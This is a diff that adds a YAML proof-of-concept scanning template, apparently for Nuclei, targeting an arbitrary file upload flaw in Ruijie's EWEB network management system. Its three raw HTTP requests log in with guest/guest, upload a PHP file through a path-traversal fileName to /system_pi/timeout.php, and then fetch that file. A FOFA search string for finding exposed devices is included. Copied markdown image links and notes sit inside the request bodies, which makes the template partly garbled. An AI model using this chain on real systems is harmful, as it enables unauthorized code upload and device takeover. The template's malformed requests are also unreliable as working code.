@@ -1,0 +1,95 @@
+id: poc-sk5oq5q7ph6w0yb1
+info:
+  name: 锐捷网络-EWEB网管系统timeout存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sk5oq5q7ph6w0yb1'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sk5oq5q7ph6w0yb1
+    fofa: title="锐捷网络-EWEB网管系统"
+http:
+- raw:
+  - 'POST /ddi/server/login.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0
+
+    Content-Length: 30
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: keep-alive
+
+
+    username=guest&password=guest?
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1743502470352-64db59f4-a102-44fe-b965-2b729f54122e.png)
+
+    利用可用cookie带入上传接口'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /system_pi/timeout.php?a=upload HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+    Content-Length: 62
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: RUIJIEID=jftm33hn1crv2sehrdd79rjv36; path=/; HttpOnly;
+
+    X-Requested-With: XMLHttpRequest
+
+    Connection: keep-alive
+
+
+    fileName=../tmp/html/112233.php&mes=<?php echo 1234567891011;?>
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1743502470554-6dcea63b-a849-41c3-b45a-140de612b22b.png)
+
+    访问文件'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /112233.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+    Connection: keep-alive
+
+    Cookie: RUIJIEID=jftm33hn1crv2sehrdd79rjv36
+
+    Accept-Encoding: gzip, deflate, br
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1743502470708-b11a64d7-5fec-4f26-962e-da8c0dfaa074.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
